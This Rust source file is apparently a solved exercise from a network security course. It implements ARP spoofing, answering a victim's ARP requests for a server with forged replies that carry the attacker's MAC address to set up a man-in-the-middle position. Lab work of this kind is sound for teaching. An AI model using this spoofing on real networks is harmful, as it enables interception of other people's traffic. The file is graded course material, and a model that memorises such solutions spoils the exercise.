use color_eyre::{
    Result,
    eyre::{OptionExt, bail},
};
use pnet::{
    packet::arp::{Arp, ArpOperations, ArpPacket, MutableArpPacket},
    util::MacAddr,
};
use tracing::{debug, info, trace};

use crate::constants::{SERVER_IP, VICTIM_IP};

pub struct ArpHandler {
    own_mac_address: MacAddr,
}

impl ArpHandler {
    pub fn new(own_mac_address: MacAddr) -> Self {
        Self { own_mac_address }
    }

    /// Handle a raw ARP packet.
    ///
    /// # Returns
    ///
    /// - Ok(Vec<u8>) to send a reponse
    /// - Ok(None) to ignore the packet
    /// - Err on error
    pub fn handle_packet(&mut self, packet: &[u8], _options: ()) -> Result<Option<Vec<u8>>> {
        // # Exercise 1.2
        //
        // Implement the handling of an ARP packet. This function should perform
        // the ARP spoofing by sending valid ARP replies to the victim host.
        // Once correctly implemented, you should pass test cases #0 and #1.

        let Some(incoming_packet) = ArpPacket::new(packet) else {
            bail!("could not build ARP packet from {packet:02X?}")
        };

        trace!(?incoming_packet, "Incoming ARP packet.");

        if matches!(incoming_packet.get_operation(), ArpOperations::Reply) {
            trace!("Ignoring ARP reply.");
            return Ok(None);
        }

        if !self.should_intercept(&incoming_packet) {
            return Ok(None);
        }

        debug!(?incoming_packet, "Handling ARP request.");

        let params = Arp {
            // Fill metadata from incoming packet.
            hardware_type: incoming_packet.get_hardware_type(),
            protocol_type: incoming_packet.get_protocol_type(),
            hw_addr_len: incoming_packet.get_hw_addr_len(),
            proto_addr_len: incoming_packet.get_proto_addr_len(),

            // Sending an ARP reply, reversing direction.
            operation: ArpOperations::Reply,
            sender_proto_addr: incoming_packet.get_target_proto_addr(),
            target_hw_addr: incoming_packet.get_sender_hw_addr(),
            target_proto_addr: incoming_packet.get_sender_proto_addr(),

            // Pretend to be `mitm-server`.
            sender_hw_addr: self.own_mac_address,

            payload: Vec::new(), // Empty.
        };
        let mut packet = vec![0u8; ArpPacket::packet_size(&params)];
        let mut outgoing_packet =
            MutableArpPacket::new(&mut packet).ok_or_eyre("cannot build ARP packet")?;
        outgoing_packet.populate(&params);

        info!(?incoming_packet, ?outgoing_packet, "Spoofing ARP reply.");

        Ok(Some(packet))
    }

    fn should_intercept(&self, incoming_packet: &ArpPacket<'_>) -> bool {
        match (
            incoming_packet.get_sender_proto_addr(),
            incoming_packet.get_target_proto_addr(),
        ) {
            (VICTIM_IP, SERVER_IP) => {
                trace!("Handling ARP request.");
                true
            }
            (sender_ip, target_ip) => {
                trace!("Ignoring ARP request from {sender_ip} for {target_ip}");
                false
            }
        }
    }
}
